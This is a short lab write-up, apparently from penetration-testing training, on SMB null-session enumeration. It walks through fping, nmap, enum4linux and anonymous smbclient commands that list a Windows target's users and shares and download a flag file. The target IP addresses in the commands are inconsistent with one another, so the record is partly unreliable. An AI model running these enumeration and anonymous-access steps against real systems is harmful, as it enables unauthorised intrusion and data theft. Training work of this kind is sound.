Null Session

Goal - The final goal of the lab is to retrieve information from the target machine such as shares, users, groups, and so on! Moreover, by navigating the remote machine, you should be able to find a file name "Congratulations.txt\". Download it and explore its content.

I connect first to the VPN

IP Address=192.168.99.100

So first, let's fping the ip subnet range, to find our target
Command - fping -a -g 192.168.99.0/24

We find our target - 192.168.99.162 - Image N1

We now run a scan, to find if the smb port exists
Command -Nmap -sV 192.168.99.162 -p 0-600 -O -vv
I get - Image N2

Though the OS could not be determined, it is surely a system with Windows OS, as seen from the port versions 

We now run an enum4linux scan over the target
Command - enum4linux 192.168.99.100

We get Images N3 , N3 (1),N3 (2),N3 (3),N3 (4),N3 (5)

Users on the SMB - Frank,eLS,Guest,HelpAssistant and netadmin


Now,we perform a nmap scan,to enumerate the smb shares
Command -nmap -sV 192.168.99.100 --script=smb-enum* -vv
We get - Image N4

Since this was a null session lab, I was not granted normal anonymous entry and gained entry, into the share, using the anonymous method

According to our notes, we find that both IPC and C shares are exploitable

Command - smbclient //192.168.43.163/IPC$ -U ""

I make my way in but am denied from listing the contents, using 'ls'.

I look again at the shares list and find that IPC, Frank, and FrankDocs are denied from listing the contents.

From the list, we see that WorkSharing seems alright, so let's target it

Command - smbclient //192.168.43.163/WorkSharing -U ""

I make my way in, and upon ls'ing, I find - Image N5

Now to download the file off the server
Commands:-
tarmode
recurse
prompt
mget Congratulations.txt /

The file get's downloaded to our /root directory.Catting it,we find - Image N6
